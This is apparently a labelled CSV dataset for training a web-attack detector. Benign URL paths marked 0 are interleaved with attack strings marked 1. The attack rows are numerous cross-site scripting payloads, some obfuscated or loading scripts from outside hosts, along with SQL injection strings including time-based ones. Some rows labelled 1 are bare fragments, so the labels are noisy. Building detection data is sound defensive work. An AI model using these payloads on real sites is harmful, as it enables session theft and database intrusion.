payload,label
/login.html?category=kma754,0
/login.html?token=hải435,0
/search?category=contact658,0
/api/v1/users?user=contact706,0
/api/v1/users?q=shoes368,0
/assets/style.css?user=book880,0
/api/v1/users?page=hải718,0
/home?token=admin577,0
/index.php?id=hải594,0
/index.php?user=apple437,0
/assets/style.css?id=apple242,0
/home?token=123176,0
/index.php?user=book876,0
/search?user=admin853,0
/login.html?user=admin784,0
/product/detail?token=kma943,0
/home?q=contact529,0
"<IMG SRC=""jav ascript:document.cookie=true;"">",1
/index.php?category=hải210,0
/login.html?token=admin148,0
""" OR 1=1;#",1
/search?user=kma61,0
/product/detail?category=admin156,0
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",1
/assets/style.css?page=contact710,0
/api/v1/users?token=shoes207,0
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",1
/assets/style.css?user=book989,0
/login.html?category=contact104,0
&#0060,1
/home?category=profile971,0
/assets/style.css?page=profile346,0
"<DIV STYLE=""background-image: url(javascript:document.cookie=true;)"">",1
/api/v1/users?id=book912,0
/api/v1/users?user=kma403,0
"<A HREF=""http://www.google.com./"">XSS</A>",1
/api/v1/users?id=kma707,0
"<XSS STYLE=""xss:expression(alert('XSS'))"">",1
/login.html?q=book511,0
/home?q=contact206,0
/search?token=profile712,0
/search?q=12353,0
/login.html?user=1233,0
/product/detail?id=123212,0
/api/v1/users?id=profile539,0
/api/v1/users?token=shoes243,0
/product/detail?q=2026363,0
/api/v1/users?page=admin824,0
/home?user=hải999,0
-1<BODY ONLOAD=document.cookie=true;>,1
/home?page=contact403,0
/home?q=shoes261,0
/product/detail?category=hải432,0
/home?user=shoes239,0
/home?user=kma527,0
/home?id=2026474,0
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-&eo=MS932,1
/login.html?id=shoes920,0
/assets/style.css?page=hải221,0
/index.php?id=shoes328,0
/index.php?token=shoes309,0
/home?user=contact511,0
/home?page=hải187,0
/product/detail?page=contact202,0
/home?category=apple180,0
/search?token=123327,0
/home?category=2026416,0
"-1<div style=""width: expression(document.cookie=true;);"">",1
/assets/style.css?page=202652,0
/product/detail?id=shoes500,0
/home?id=contact56,0
/login.html?user=profile63,0
/login.html?user=kma384,0
/search?page=admin460,0
/home?page=2026449,0
/<svg%20onload=alert(eval(‘document’+unescape(unescape(“%252e”))%2b’domain’))>,1
""" onblur=alert(1) autofocus a=""",1
/search?category=book111,0
/search?token=kma267,0
/index.php?page=admin235,0
/search?q=123749,0
/index.php?id=book609,0
"101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,1",1
/index.php?category=shoes28,0
/search?id=admin482,0
"<iframe/src=""data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">",1
/product/detail?category=kma363,0
">""<xml id=""X""><a><b><script>document.cookie=true;</script>;</b></a></xml>",1
/product/detail?q=hải19,0
/product/detail?category=profile767,0
/login.html?page=123295,0
/index.php?id=hải297,0
/assets/style.css?token=profile93,0
/api/v1/users?id=kma322,0
/index.php?page=profile623,0
/index.php?category=contact343,0
/login.html?q=apple253,0
/assets/style.css?page=shoes134,0
/assets/style.css?id=kma955,0
/api/v1/users?token=kma745,0
/product/detail?q=shoes439,0
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",1
/assets/style.css?q=kma972,0
/index.php?id=apple906,0
/assets/style.css?token=book779,0
/search?page=contact152,0
/assets/style.css?id=202658,0
/api/v1/users?id=kma527,0
/login.html?q=kma864,0
/product/detail?page=kma676,0
/home?id=contact240,0
/index.php?category=admin890,0
/index.php?id=2026588,0
/index.php?category=book452,0
/product/detail?category=contact650,0
/login.html?user=apple799,0
/api/v1/users?category=2026357,0
/home?page=contact103,0
<svg><script>//&NewLine;confirm(1);</script </svg>,1
""") OR (""1""=""1",1
/home?page=202655,0
">""</TITLE><SCRIPT>document.cookie=true;</SCRIPT>",1
/login.html?id=202651,0
/api/v1/users?user=admin532,0
/assets/style.css?q=admin525,0
/assets/style.css?id=apple982,0
/index.php?user=book625,0
/index.php?user=apple399,0
/product/detail?token=profile392,0
/home?token=admin802,0
/search?token=hải378,0
/home?user=profile634,0
/search?id=shoes722,0
/login.html?user=shoes668,0
/api/v1/users?user=apple78,0
/home?q=admin422,0
/home?page=123196,0
"<x:script xmlns:x=""http://www.w3.org/1999/xhtml"">alert('xss');</x:script>",1
/login.html?id=hải280,0
/api/v1/users?q=admin72,0
"#!prettyPhoto/<a onclick=""alert(/XSS by Evan/);"">/",1
/login.html?category=book327,0
<%<!--'%><script>alert(1);</script -->,1
/index.php?token=apple825,0
/api/v1/users?q=shoes873,0
/product/detail?id=admin721,0
/assets/style.css?id=hải314,0
/login.html?q=hải119,0
/search?id=hải19,0
<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>,1
/product/detail?id=hải231,0
/home?q=2026441,0
/product/detail?user=shoes92,0
/api/v1/users?user=kma700,0
/search?token=202691,0
/home?page=123695,0
/assets/style.css?user=2026564,0
/login.html?category=profile446,0
<isindex type=image src=1 onerror=alert(1)>,1
/login.html?q=12390,0
">""<BR SIZE=""&{document.cookie=true}"">",1
/assets/style.css?user=admin800,0
/assets/style.css?user=profile608,0
/api/v1/users?q=shoes233,0
/search?page=apple199,0
/index.php?q=contact783,0
/home?page=apple62,0
/api/v1/users?category=profile339,0
/login.html?page=kma758,0
/product/detail?q=hải818,0
/index.php?user=book102,0
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,1
/login.html?user=apple782,0
/search?token=book857,0
<SCRIPT <B>document.cookie=true;</SCRIPT>,1
/assets/style.css?page=admin164,0
/login.html?q=123324,0
<input value=<><iframe/src=javascript:confirm(1),1
/search?user=profile933,0
/api/v1/users?token=hải411,0
/search?q=kma401,0
/search?token=contact812,0
/index.php?category=profile145,0
"-1<body onload=""document.cookie=true;"">",1
/search?q=123866,0
/assets/style.css?category=hải802,0
/product/detail?user=profile636,0
/search?user=shoes593,0
/home?id=kma777,0
/home?token=profile169,0
/index.php?user=contact991,0
/assets/style.css?q=hải308,0
/search?id=2026195,0
/login.html?token=book443,0
">""<script>alert(document.cookie)</script>@gmail.com",1
/product/detail?category=apple854,0
/search?token=admin548,0
/login.html?category=book69,0
"' UNION SELECT NULL,NULL--",1
/login.html?user=contact805,0
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>",1
/login.html?category=2026766,0
/home?token=2026401,0
/login.html?id=hải409,0
/product/detail?user=profile245,0
/api/v1/users?page=apple780,0
/home?q=admin398,0
/api/v1/users?id=contact771,0
/assets/style.css?page=hải490,0
/home?user=profile765,0
/index.php?user=2026360,0
/product/detail?token=contact277,0
/login.html?q=admin321,0
/assets/style.css?q=apple167,0
/assets/style.css?token=hải371,0
/assets/style.css?category=admin95,0
/product/detail?category=kma317,0
/assets/style.css?token=contact546,0
/index.php?q=apple660,0
/home?token=admin412,0
/login.html?token=contact606,0
/login.html?q=profile691,0
/home?user=hải149,0
/index.php?q=book40,0
/product/detail?user=kma98,0
/search?user=hải304,0
/api/v1/users?id=shoes591,0
/assets/style.css?id=profile683,0
/login.html?page=admin622,0
"""><% response.write ""<script type=text/javascript>alert(document.cookie)</script>"" %>",1
/assets/style.css?category=book176,0
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('CrossSiteScripting')"")}</STYLE>",1
/home?id=hải324,0
/login.html?id=hải785,0
/login.html?category=hải512,0
/assets/style.css?id=123879,0
/index.php?user=admin617,0
/search?q=book571,0
/index.php?category=kma180,0
"<IMG """"""><SCRIPT>alert(""CrossSiteScripting"")</SCRIPT>"">",1
/api/v1/users?user=book957,0
"+49/>""<iframe src=http://vulnerability-lab.com>1337",1
/login.html?page=shoes397,0
&#X000003C,1
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},1
/index.php?token=admin199,0
/search?page=apple910,0
/home?q=contact434,0
&#x003c,1
"1"" AND 1=2",1
/product/detail?id=202667,0
') OR ('1'='1'--,1
/search?token=apple177,0
/home?id=admin458,0
SRC,1
/index.php?id=shoes917,0
/product/detail?category=1238,0
/product/detail?q=2026500,0
/product/detail?q=admin916,0
/api/v1/users?page=profile623,0
/product/detail?token=admin187,0
/login.html?category=admin12,0
/product/detail?q=admin715,0
/login.html?user=123739,0
/api/v1/users?user=2026234,0
/login.html?category=kma85,0
'); WAITFOR DELAY '0:0:5'--,1
/api/v1/users?id=2026796,0
""") OR ""1""=""1",1
<iframe src=http://vulnerability-lab.com/index.html <,1
/search?category=123483,0
/assets/style.css?id=kma250,0
/api/v1/users?user=kma786,0
/assets/style.css?q=2026273,0
%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%48%65%6C%6C%6F%27%29%3C%2F%73%63%72%69%70%74%3E,1
/index.php?q=profile555,0
/index.php?token=123545,0
/product/detail?id=apple419,0
/index.php?id=shoes768,0
/product/detail?user=shoes818,0
/api/v1/users?category=profile628,0
/api/v1/users?category=admin472,0
s,1
/home?category=2026854,0
/search?category=2026590,0
/home?category=123795,0
/login.html?page=profile966,0
/product/detail?category=contact449,0
/index.php?page=hải926,0
/login.html?id=shoes345,0
/login.html?id=contact661,0
/assets/style.css?user=123408,0
/index.php?id=2026681,0
/login.html?q=hải346,0
/api/v1/users?id=admin619,0
/product/detail?user=book132,0
/index.php?q=contact97,0
<SCRIPT SRC=//ha.ckers.org/.j>,1
/login.html?category=contact698,0
/assets/style.css?id=apple125,0
/search?q=123712,0
/product/detail?category=2026905,0
/login.html?id=profile11,0
/home?token=profile3,0
/login.html?token=book959,0
/assets/style.css?category=profile601,0
/index.php?user=123993,0
/index.php?token=2026138,0
/product/detail?id=contact598,0
/product/detail?q=book278,0
/index.php?id=profile104,0
/home?user=contact725,0
/index.php?user=apple40,0
&#00060,1
/product/detail?id=apple727,0
/home?user=apple835,0
/index.php?page=hải176,0
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",1
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;""></BODY></HTML>",1
/assets/style.css?category=hải655,0
/product/detail?id=apple379,0
/index.php?token=apple446,0
/login.html?category=book291,0
/product/detail?id=profile786,0
/home?page=shoes112,0
&#x000003c,1
/home?user=hải847,0
/home?id=shoes616,0
/home?user=shoes269,0
/index.php?page=profile245,0
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,1
">""<SCRIPT>document.cookie=true;//<</SCRIPT>",1
/product/detail?q=profile689,0
"<IMG LOWSRC=""javascript:alert('CrossSiteScripting')"">",1
/assets/style.css?page=admin269,0
e,1
">""exp/*<A STYLE='no\CrossSiteScripting:noCrossSiteScripting(""*//*"");CrossSiteScripting:ex/*CrossSiteScripting*//*/*/pression(document.cookie=true)'>",1
/home?token=2026384,0
/login.html?category=shoes350,0
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",1
/assets/style.css?token=2026222,0
"-1<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-",1
/assets/style.css?user=contact154,0
/home?id=contact430,0
/login.html?user=123711,0
/home?q=hải731,0
/api/v1/users?q=contact199,0
/search?token=kma516,0
/api/v1/users?token=profile954,0
/login.html?id=kma155,0
/login.html?category=shoes981,0
/home?token=123453,0
/index.php?category=admin243,0
/search?user=profile374,0
/search?id=123607,0
/assets/style.css?page=contact777,0
/login.html?category=profile402,0
/product/detail?user=admin306,0
/login.html?user=kma564,0
/search?page=123540,0
/search?q=apple827,0
/api/v1/users?q=contact295,0
/index.php?token=hải642,0
/index.php?user=profile266,0
/login.html?category=apple616,0
/login.html?token=admin525,0
/assets/style.css?user=123931,0
/login.html?token=book2,0
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-,1
/index.php?token=123800,0
/index.php?token=apple721,0
/home?page=apple15,0
/home?page=contact719,0
/index.php?id=contact551,0
/search?id=apple874,0
/assets/style.css?token=apple174,0
/login.html?page=profile305,0
/login.html?q=2026822,0
/product/detail?id=kma71,0
"""()&%<ScRiPt >prompt(/XSS/)</ScRiPt>",1
/login.html?q=hải298,0
/assets/style.css?category=admin473,0
/api/v1/users?q=book506,0
/assets/style.css?user=hải747,0
/index.php?user=2026262,0
/api/v1/users?id=kma82,0
/search?token=kma590,0
/assets/style.css?token=kma87,0
/assets/style.css?q=2026512,0
“><img src=bogus onError=alert(23)>,1
"CHAR(39,79,82,39,49,39,61,39,49)",1
/index.php?q=apple919,0
/login.html?category=contact597,0
/api/v1/users?page=apple514,0
/home?token=kma437,0
/login.html?token=hải948,0
/login.html?user=contact978,0
/search?q=apple252,0
/product/detail?token=2026785,0
"<%tag style=""xss:expression(alert(123))"">",1
/assets/style.css?category=shoes491,0
/login.html?category=profile411,0
/login.html?token=2026560,0
<svg/onload=prompt(1);>,1
/assets/style.css?token=kma929,0
/search?page=profile960,0
<img src=x onerror=alert(0)>,1
/assets/style.css?q=book391,0
">""<CrossSiteScripting STYLE=""CrossSiteScripting:expression(document.cookie=true)"">",1
/home?user=shoes488,0
/search?id=2026335,0
/index.php?category=shoes226,0
/assets/style.css?id=admin650,0
/login.html?page=admin827,0
/home?page=shoes83,0
">""<STYLE TYPE=""text/javascript"">document.cookie=true;</STYLE>",1
/index.php?q=123415,0
/product/detail?token=book441,0
">""<div style=""background-image: url(javascript:document.cookie=true;);"">",1
/api/v1/users?token=profile292,0
/home?token=123600,0
/api/v1/users?id=kma536,0
/login.html?q=shoes355,0
/api/v1/users?token=shoes856,0
/home?user=admin13,0
/product/detail?user=profile473,0
/search?category=2026338,0
/assets/style.css?q=apple346,0
/assets/style.css?token=2026636,0
/api/v1/users?token=book236,0
/login.html?user=apple60,0
/index.php?id=hải494,0
/product/detail?category=contact247,0
/index.php?token=book160,0
/login.html?token=profile286,0
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('CrossSiteScripting')></OBJECT>,1
/product/detail?token=kma412,0
/login.html?user=kma714,0
/index.php?category=kma512,0
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",1
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",1
&#X3c,1
%A2%BE%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,1
/index.php?category=kma252,0
/search?user=book694,0
/home?page=apple675,0
/login.html?token=202624,0
<IMG SRC=jalert('XSS')>,1
/search?user=apple500,0
/index.php?category=kma178,0
"-1<IMG STYLE=""CrossSiteScripting:expr/*CrossSiteScripting*/ession(document.cookie=true)"">",1
/api/v1/users?category=book727,0
/api/v1/users?q=contact209,0
/index.php?token=profile928,0
/search?q=shoes518,0
/assets/style.css?token=shoes21,0
/index.php?q=kma131,0
/login.html?q=shoes535,0
/product/detail?user=2026578,0
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",1
/login.html?q=shoes883,0
/api/v1/users?id=apple83,0
/search?token=book520,0
/login.html?id=kma112,0
/assets/style.css?user=kma701,0
/product/detail?id=profile504,0
/login.html?q=contact602,0
/login.html?category=kma672,0
/index.php?page=contact397,0
/product/detail?user=kma346,0
/product/detail?q=202624,0
/login.html?id=contact192,0
/product/detail?category=123592,0
<video src=1 onerror=alert(1)>,1
/product/detail?category=contact789,0
/home?id=shoes792,0
/assets/style.css?user=123777,0
/product/detail?page=contact317,0
/api/v1/users?page=book670,0
/product/detail?id=profile956,0
/assets/style.css?user=2026261,0
/index.php?token=contact360,0
/index.php?user=123809,0
/home?q=book78,0
/login.html?token=contact125,0
/login.html?user=2026211,0
/api/v1/users?q=2026625,0
">""<IMG STYLE=""CrossSiteScripting:expr/*CrossSiteScripting*/ession(document.cookie=true)"">",1
/assets/style.css?q=apple166,0
<marquee<marquee/onstart=confirm(2)>/onstart=confirm(1)>,1
"-1<DIV STYLE=""width: expression(document.cookie=true);"">",1
/search?category=profile50,0
/product/detail?page=admin580,0
/home?user=shoes81,0
/search?id=shoes545,0
/search?page=kma143,0
">""<IFRAME SRC=""javascript:document.cookie=true;""></IFRAME>",1
"\"";alert(1);//",1
/search?q=123375,0
"echo('IPT>alert(""CrossSiteScripting"")</SCRIPT>'); ?>",1
/index.php?q=hải706,0
/assets/style.css?category=book779,0
this['\x64\x6f\x63\x75\x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'kie'],1
"data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=",1
/assets/style.css?user=kma197,0
/home?q=hải13,0
/home?id=apple186,0
"""><script src=https://x.com></script>",1
/search?q=123408,0
/home?id=contact204,0
/assets/style.css?q=2026277,0
/product/detail?user=hải687,0
"""><IMG SRC=# onmouseover=""alert('xss')"">",1
/login.html?user=123991,0
/home?q=apple950,0
/api/v1/users?q=2026803,0
/index.php?category=admin866,0
/home?id=contact75,0
/login.html?page=profile915,0
/api/v1/users?category=admin964,0
<iframe/src \/\/onload = prompt(1),1
/index.php?q=hải931,0
/search?q=contact976,0
/index.php?token=123121,0
/login.html?page=book209,0
/index.php?category=shoes98,0
/login.html?q=profile11,0
/api/v1/users?user=hải294,0
/search?page=kma530,0
/search?category=book874,0
/assets/style.css?token=contact728,0
/index.php?q=apple827,0
/product/detail?token=contact724,0
/index.php?q=contact914,0
/product/detail?category=profile719,0
/api/v1/users?id=admin389,0
/assets/style.css?id=shoes432,0
/api/v1/users?user=contact930,0
/index.php?user=123707,0
/assets/style.css?user=apple526,0
/login.html?token=2026943,0
/login.html?page=book557,0
/index.php?user=shoes544,0
/search?category=shoes766,0
A,1
/api/v1/users?category=book475,0
/home?token=kma518,0
/api/v1/users?id=profile727,0
/login.html?page=admin811,0
/login.html?token=apple736,0
/api/v1/users?q=123965,0
"""><img src=x onerror=prompt(1);>",1
/search?token=contact336,0
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,1
/index.php?user=2026696,0
/product/detail?id=admin702,0
/product/detail?page=123851,0
&#x00003c,1
/home?user=hải255,0
/home?q=book976,0
/api/v1/users?page=shoes539,0
/assets/style.css?q=apple226,0
/index.php?token=contact410,0
/index.php?category=hải550,0
"<xml id=""X""><a><b><script>document.cookie=true;</script>;</b></a></xml>",1
/product/detail?id=admin851,0
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",1
/home?token=book582,0
/login.html?q=apple126,0
/assets/style.css?id=apple985,0
/assets/style.css?page=admin454,0
/index.php?user=book292,0
/home?q=kma57,0
/search?user=123627,0
/search?page=12311,0
/index.php?user=hải219,0
\u003C,1
/assets/style.css?page=apple621,0
/home?page=book225,0
/home?token=kma719,0
&#x0003C,1
/search?q=profile68,0
/product/detail?q=shoes174,0
/search?page=contact930,0
/product/detail?token=admin446,0
/login.html?q=profile552,0
&#X03C;,1
/search?category=hải617,0
/search?token=profile385,0
/home?id=123957,0
/home?category=apple823,0
/index.php?user=123343,0
"""><img src=x onerror=alert(document.domain)>",1
/assets/style.css?page=shoes808,0
/api/v1/users?user=2026679,0
/home?user=shoes494,0
/product/detail?category=contact780,0
/index.php?category=contact527,0
/search?id=123971,0
"-1<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>",1
/product/detail?page=apple744,0
/api/v1/users?category=hải865,0
/index.php?page=profile382,0
/product/detail?category=profile856,0
/index.php?q=admin280,0
/api/v1/users?category=123704,0
/search?page=shoes911,0
/index.php?category=profile8,0
/product/detail?q=hải509,0
/home?token=admin115,0
"xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",1
/search?category=book607,0
/login.html?page=apple532,0
/assets/style.css?token=2026180,0
/index.php?q=admin687,0
/index.php?page=admin825,0
/login.html?user=apple598,0
/assets/style.css?user=kma98,0
/product/detail?category=2026654,0
/home?id=admin445,0
/home?category=book795,0
/search?user=kma984,0
"?value=A%27)%3b}%3balert(document.cookie)%3bif(0){var+html%3dwindow.opener.document.querySelector(%27[%3d""",1
/index.php?q=kma261,0
' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)='1,1
/home?id=profile314,0
/api/v1/users?id=apple495,0
/login.html?user=profile370,0
/home?q=book558,0
/assets/style.css?page=book607,0
"<bgsound src=""javascript:document.cookie=true;"">",1
/login.html?token=kma521,0
"<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",1
/api/v1/users?token=contact103,0
/assets/style.css?category=hải99,0
/search?q=profile138,0
/search?id=hải438,0
/assets/style.css?q=apple629,0
/assets/style.css?page=admin35,0
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1
/assets/style.css?user=2026527,0
/product/detail?q=shoes645,0
/api/v1/users?token=apple113,0
/assets/style.css?page=book968,0
/home?id=kma916,0
/index.php?id=contact720,0
/login.html?token=2026139,0
/assets/style.css?user=12341,0
/assets/style.css?page=apple172,0
/index.php?id=202621,0
/product/detail?page=shoes300,0
/search?id=admin732,0
"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>",1
/assets/style.css?category=book279,0
/search?q=book466,0
/product/detail?page=shoes342,0
/login.html?id=apple979,0
/home?category=2026516,0
/product/detail?user=2026470,0
/product/detail?page=shoes200,0
/search?q=kma265,0
/search?id=kma467,0
/api/v1/users?id=book165,0
/api/v1/users?token=apple588,0
/product/detail?q=profile517,0
"""><img src=x onerror=prompt(/omur/)>",1
/assets/style.css?page=shoes758,0
/api/v1/users?user=kma762,0
/product/detail?page=book840,0
/login.html?token=shoes23,0
/index.php?id=kma416,0
/index.php?id=123145,0
"<?import namespace=""t"" implementation=""#default#time2"">",1
' OR 1=1 --,1
/api/v1/users?user=2026595,0
"-1<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]<![CDATA[cript:document.cookie=true;"">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",1
/login.html?category=apple585,0
/index.php?id=profile377,0
/index.php?id=123958,0
/product/detail?id=shoes318,0
/product/detail?token=123341,0
/product/detail?user=123253,0
%73%73%53%69%74%65%53%63%72%69%70%74%69%6E%67%32%22%29%3C%2F,1
"-1<DIV STYLE=""background-image: url(javascript:document.cookie=true;)"">",1
/product/detail?id=book304,0
/api/v1/users?category=profile364,0
/product/detail?user=123399,0
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",1
/login.html?user=hải758,0
/search?id=kma390,0
"<formaction='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'><button>CLICK",1
/product/detail?category=book336,0
/login.html?token=hải198,0
/product/detail?user=hải884,0
/search?category=book464,0
/search?page=kma584,0
/product/detail?page=2026395,0
/home?page=123288,0
/search?category=apple775,0
/index.php?page=admin763,0
/search?q=admin312,0
/login.html?user=kma658,0
/home?page=2026631,0
/index.php?page=kma501,0
/assets/style.css?page=admin393,0
/search?q=apple157,0
/product/detail?user=shoes33,0
/product/detail?q=hải123,0
/login.html?category=profile849,0
/assets/style.css?id=kma922,0
/product/detail?id=book251,0
/search?q=book3,0
/product/detail?token=kma523,0
/search?category=profile768,0
/home?id=profile603,0
"""123""+style=""behavior:url(http://www.biznet.com.tr/xss.htc)""",1
-1<<script>document.cookie=true;</script>,1
/product/detail?page=kma202,0
/login.html?user=admin875,0
/index.php?id=profile213,0
/index.php?page=contact595,0
/search?page=admin913,0
/login.html?user=shoes975,0
<img src=x:alert(alt) onerror=eval(src) alt=0>,1
/home?user=2026279,0
/assets/style.css?user=123216,0
/search?token=contact361,0
"<svg xmlns:xlink=""http://www.w3.org/1999/xlink""><a><circle r=100 /><animate attributeName=""xlink:href"" values="";javascript:alert(1)"" begin=""0s"" dur=""0.1s"" fill=""freeze""/>",1
a,1
/index.php?q=2026846,0
/login.html?q=apple2,0
"-1<img src=""javascript:document.cookie=true;"">",1
/product/detail?category=123286,0
/product/detail?category=profile386,0
/assets/style.css?id=shoes712,0
/product/detail?user=2026380,0
/index.php?q=apple912,0
/home?id=2026478,0
/assets/style.css?category=2026745,0
/assets/style.css?q=12320,0
/search?category=apple619,0
/index.php?page=123111,0
/api/v1/users?user=book547,0
/index.php?q=contact66,0
"xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>",1
/index.php?page=book517,0
/index.php?id=hải353,0
/api/v1/users?id=contact271,0
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS",1
/home?id=profile33,0
/home?user=apple600,0
/index.php?q=hải708,0
/assets/style.css?id=profile126,0
/login.html?page=hải661,0
/assets/style.css?category=apple572,0
/search?id=profile407,0
/login.html?category=profile341,0
/product/detail?page=shoes321,0
/search?q=apple347,0
/product/detail?category=kma882,0
/api/v1/users?category=2026626,0
/home?q=2026432,0
/product/detail?category=shoes441,0
/assets/style.css?user=admin148,0
/index.php?page=shoes695,0
/home?page=123783,0
"a=""get"";",1
/assets/style.css?user=2026383,0
/api/v1/users?user=123461,0
/index.php?user=hải11,0
/search?id=book569,0
/index.php?q=shoes435,0
/home?q=2026487,0
/index.php?category=contact221,0
/login.html?q=admin239,0
/login.html?token=2026864,0
/api/v1/users?q=2026380,0
/api/v1/users?page=contact254,0
/index.php?id=hải621,0
/search?id=profile876,0
/index.php?page=contact135,0
"set system location ""><iframe src=a onload=alert(""VL"") <",1
/api/v1/users?page=contact990,0
/assets/style.css?q=shoes921,0
/login.html?category=contact821,0
/home?q=2026837,0
/product/detail?q=hải755,0
/api/v1/users?id=contact254,0
/api/v1/users?category=202645,0
/index.php?token=kma352,0
/search?id=kma319,0
/product/detail?user=hải151,0
"""><script>prompt(1)</script>",1
/search?q=admin744,0
<img src=`xx:xx`onerror=alert(1)>,1
/login.html?id=2026278,0
window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]],1
/api/v1/users?category=123700,0
/product/detail?token=2026834,0
/index.php?token=shoes204,0
/assets/style.css?page=apple855,0
/index.php?id=2026710,0
/search?q=apple610,0
/search?q=profile576,0
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera},1
/home?q=profile870,0
/search?user=kma193,0
/product/detail?id=apple815,0
"<LAYER SRC=""javascript:document.cookie=true;""></LAYER>",1
/search?category=profile679,0
/search?user=book232,0
/home?id=2026596,0
/search?page=book381,0
/search?page=apple499,0
/index.php?page=book80,0
/index.php?category=hải968,0
/login.html?category=kma537,0
/home?q=123947,0
